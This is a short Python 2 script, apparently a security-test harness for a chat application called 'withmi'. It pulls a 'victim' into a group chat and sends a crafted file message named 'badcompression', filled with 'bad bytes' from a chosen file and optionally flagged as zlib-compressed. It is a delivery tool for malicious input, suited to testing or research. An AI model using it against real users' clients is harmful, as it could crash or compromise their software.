import argparse
from withmi_client import WithMiClient
import chat_pb2
import uuid
import time
import random

def main():
    parser = argparse.ArgumentParser(description="test for withmi")
    parser.add_argument('host', help='host we want to connect to')
    parser.add_argument('port', help='port we want to connect to')
    parser.add_argument('name', help='user name')
    parser.add_argument('wait', help='amount of time to wait for an ack (in seconds)')
    parser.add_argument('file', help='file to transfer to victim')
    parser.add_argument('zlib', help='use zlib compression -- optional', nargs='?', default=False)
    args = parser.parse_args()
    
    port = int(args.port)
    wait = float(args.wait)
    send_file(args.name, args.host, port, wait, args.file, args.zlib)


def send_file(name, host, port, wait, file, zlib):

    n = random.randint(0, 190) # randomizing callback port in case it's still in use from previous test
    client = WithMiClient(name, wait)
    client.connect(host, port, "localhost", 9010+n)
    time.sleep(3)
    unique_id = str(uuid.uuid4())

    # tell the victim to join your group
    client.send_chatstate(unique_id, "myChat")
    msg = get_bad_msg(client, file, 1, unique_id, zlib);

    try:
        client.send_withmi_msg(msg)
        # let's the victim know they can close
        client.send_text("all done", unique_id)

        # give the user some time to send a final message
        time.sleep(5)

    except Exception, e:
        print "Error sending: " + str(e)
    finally:
        client.close()
    print "Done"

def get_bad_msg(client, file, i, uid, zlib):
    # what are the bad bytes we want
    with open(file, "rb") as bad_file:
        file_content = bad_file.read()

    # build the bad file to send
    msg = chat_pb2.WithMiMsg()
    msg = client.create_msg(chat_pb2.WithMiMsg.FILE, uid)
    msg.fileMsg.fileName = "badcompression" + str(i)
    msg.fileMsg.currentOffset = 0
    msg.fileMsg.content = file_content
    msg.fileMsg.totalSize = len(file_content)
    if zlib:
        msg.fileMsg.zlibCompression = True
    msg.fileMsg.done = True
    return msg

if __name__ == '__main__':
    main()
